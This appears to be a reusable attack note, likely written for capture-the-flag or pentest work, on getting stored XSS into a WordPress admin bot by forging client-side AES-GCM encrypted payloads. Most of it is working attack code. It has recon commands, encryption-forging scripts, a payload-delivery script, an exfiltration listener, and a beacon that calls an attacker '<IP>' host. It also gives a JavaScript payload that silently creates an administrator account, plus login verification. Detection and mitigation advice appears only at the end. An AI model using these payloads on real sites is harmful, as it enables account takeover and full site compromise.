---
title: WordPress admin-bot XSS with a forged encrypted payload
tags: [wordpress, xss, aes-gcm, admin-bot, web]
---

# WordPress admin-bot XSS with a forged encrypted payload

**English** | [🇪🇸 Español](wp-admin-bot-xss.md)

> Reusable note. It applies when a theme/plugin encrypts data **in the browser** with a key shipped to the client, and the server decrypts it and renders it in the admin panel.

## When it applies (checklist)

- [ ] `wp-admin/admin-ajax.php` exposes custom actions (`action=...`).
- [ ] `wp_localize_script` / `wp_add_inline_script` leak a `nonce` in the HTML.
- [ ] The theme JS contains the key (`ENCRYPTION_KEY`, `SECRET`, `PASS`) or a derivation (`crypto.subtle.digest`).
- [ ] An admin bot (chromedriver/puppeteer) logs in periodically.
- [ ] The stored value is rendered **unescaped** on a `wp-admin` page.

If all of that holds, encryption is not a trust boundary — it is a format you can reproduce.

## 1. Reading the JS

```bash
# find the script that holds the logic
curl -s https://target/ | grep -oE 'wp-content/themes/[A-Za-z0-9_-]+' | sort -u
curl -s https://target/wp-content/themes/<theme>/assets/js/app.js -o app.js

# patterns worth grepping
grep -nE 'admin-ajax|ajax_url|nonce|encrypt|decrypt|subtle|crypto|FormData' app.js | head -40
```

The nonce usually comes from a localized object in the HTML:

```bash
curl -s https://target/ > home.html
grep -o 'var [a-zA-Z_]* *= *{"ajax_url".*}' home.html
```

Three things come out of it: the **action**, the **exact field names** and the **nonce**. Field names are where most attempts die (`payload` vs `encrypted_payload`, `file` vs `voice_recording`): copy them from `formData.append(...)`, never guess.

## 2. Reproducing the encryption

The usual pattern: AES-256 key = `SHA-256(key_text)`, 12-byte IV, tag appended.

```python
import base64, hashlib, json, os
from Crypto.Cipher import AES

KEY = "<key from the JS>"

def encrypt(obj):
    key = hashlib.sha256(KEY.encode()).digest()
    iv  = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(iv + ct + tag).decode()   # IV | ciphertext | tag
```

Node equivalent, handy to compare byte for byte with the browser:

```js
const crypto = require('crypto');
const key = crypto.createHash('sha256').update(KEY).digest();
const iv = crypto.randomBytes(12);
const c = crypto.createCipheriv('aes-256-gcm', key, iv);
const ct = Buffer.concat([c.update(JSON.stringify(obj)), c.final()]);
const out = Buffer.concat([iv, ct, c.getAuthTag()]).toString('base64');
```

Details that break compatibility:

- `crypto.subtle.encrypt({name:'AES-GCM', iv}, key, data)` returns **ciphertext‖tag**: the IV goes first and the tag is already included.
- Derivation: `SHA-256` of the key, not the raw key and not PBKDF2. Confirm it in the JS (`subtle.digest`) before assuming.
- IV length (12 for GCM) and concatenation order.
- `btoa` yields standard base64; if the JS uses `base64url`, `+` and `/` change.

## 3. Sending the payload

- **Refresh the nonce on every attempt**: it expires and the endpoint answers `-1` or nothing.
- **Match the `Content-Type`**: the browser uses `FormData` → `multipart/form-data`. In Python, `files={field: (None, value)}` forces multipart without attaching files.
- **Do the prerequisite step**: if the flow creates a `post_id`/`upload_id`, that ID is what the endpoint validates against.

```python
import requests
s = requests.Session(); s.verify = False

home  = s.get("https://target/").text
nonce = re.search(r'"nonce"\s*:\s*"([0-9a-zA-Z]+)"', home).group(1)

# step 1: create the parent object
r = s.post("https://target/wp-admin/admin-ajax.php",
           files={"voice_recording": ("v.wav", wav_bytes, "audio/wav")},
           data={"action": "save_voice_raw", "nonce": nonce})
post_id = r.json()["data"]["post_id"]

# step 2: send the encrypted payload
blob = encrypt({"transcription": "ok", "summary": XSS_HTML})
s.post("https://target/wp-admin/admin-ajax.php",
       files={"action": (None, "save_voice_results"),
              "nonce": (None, nonce),
              "post_id": (None, str(post_id)),
              "encrypted_payload": (None, blob)})
```

## 4. XSS constraints (the ones that break payloads)

| Constraint | Symptom | Workaround |
|---|---|---|
| Rendered via `innerHTML` | `<script>` never runs, no error | `<img src=x onerror=...>`, `<svg onload=...>` |
| Escaping of `"` → `&quot;` | broken JS, nothing in console | single line, **single quotes only** |
| `wpautop` / `nl2br` | `<br>` inside the attribute | keep the payload on one line |
| `wp_kses` | `onerror` stripped | find an allowed sink (`href`, `srcset`, `<details ontoggle>`) |
| CSP `script-src 'self'` | inline blocked | serve the JS from the site itself (file upload) |
| `HttpOnly` cookies | stolen session is useless | act **inside** the browser (same-origin fetch) |

Rule of thumb: start with the smallest possible beacon and only grow once you see it arrive.

## 5. Exfiltration channel

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query)
        print("hit:", {k: unquote(v[0]) for k, v in q.items()}, flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"GIF89a")     # minimal valid response
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Beacon:

```html
<img src=x onerror="new Image().src='http://<IP>:8000/?r=ALIVE'">
```

Why `new Image()` instead of `fetch()` when the page is HTTPS: the browser blocks **active content** over HTTP from HTTPS (mixed content); an image usually gets through. If you need large responses (nonces, admin HTML), act same-origin and exfiltrate only a summary via the image.

## 6. From XSS to administrator

Two paths, both using a nonce the bot can read itself (same origin):

**A. Create an administrator** (`user-new.php`):

```js
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{var d=new DOMParser().parseFromString(t,'text/html'),n=d.querySelector('[name=_wpnonce_create-user]').value,f=new FormData();f.append('action','createuser');f.append('_wpnonce_create-user',n);f.append('_wp_http_referer','/wp-admin/user-new.php');f.append('user_login','pwned');f.append('email','pwned@target');f.append('pass1','<PASS>');f.append('pass2','<PASS>');f.append('role','administrator');f.append('createuser','Add New User');fetch('/wp-admin/user-new.php',{method:'POST',body:f}).then(r=>r.text())})
```

**B. Upload a plugin** (`plugin-install.php` → `update.php?action=upload-plugin`), noisier but straight to RCE.

**Verification that does not depend on the beacon** (the reliable check):

```bash
curl -sk -c cj.txt -b "wordpress_test_cookie=WP+Cookie+check" \
  --data-urlencode "log=pwned" --data-urlencode "pwd=<PASS>" \
  -d "wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  https://target/wp-login.php -o /dev/null -w '%{http_code}\n'   # 302 = OK
grep -c wordpress_logged_in cj.txt                              # 1
```

## 7. Common mistakes

| Mistake | Effect | How to spot it |
|---|---|---|
| Invented field name | `success` but nothing stored | diff against `formData.append` in the JS |
| Wrong action | empty answer or `0` | read the literal `action` |
| POST to the site root | 200 with the homepage | use `admin-ajax.php` |
| Expired nonce | `-1` / `403` | refresh it per request |
| Newline inside the payload | nothing executes | inspect the stored HTML as-is |
| Expecting an instant bot visit | false "it doesn't work" | the bot may take minutes; measure the cadence |
| Ephemeral data | the second attempt fails | repeat the whole flow |

## 8. Detection and mitigation

Detection:

- New accounts with the `administrator` role, especially from bot sessions.
- Requests to `user-new.php` / `update.php` with a bot `Referer` or odd timing.
- Integrity changes under `wp-content` (new plugins, new `.php` files).
- HTML payloads sitting in fields that should be plain text (database logs).

Mitigation:

- Always escape output (`esc_html`, `esc_attr`, `wp_kses_post`) and enforce capabilities + nonce in the AJAX handler.
- Never encrypt secrets client-side: if the data is sensitive, the secret belongs on the server.
- `DISALLOW_FILE_MODS` / `DISALLOW_FILE_EDIT` and strict control over `install_plugins`.
- CSP without `unsafe-inline`; session cookies `HttpOnly` (already the case) and `Secure`.

## References

- OWASP — Cross Site Scripting: <https://owasp.org/www-community/attacks/xss/>
- WordPress — Nonces and capabilities: <https://developer.wordpress.org/apis/security/nonces/>
- MDN — `SubtleCrypto.encrypt`: <https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt>
- CWE-79 · CWE-798 · CWE-434
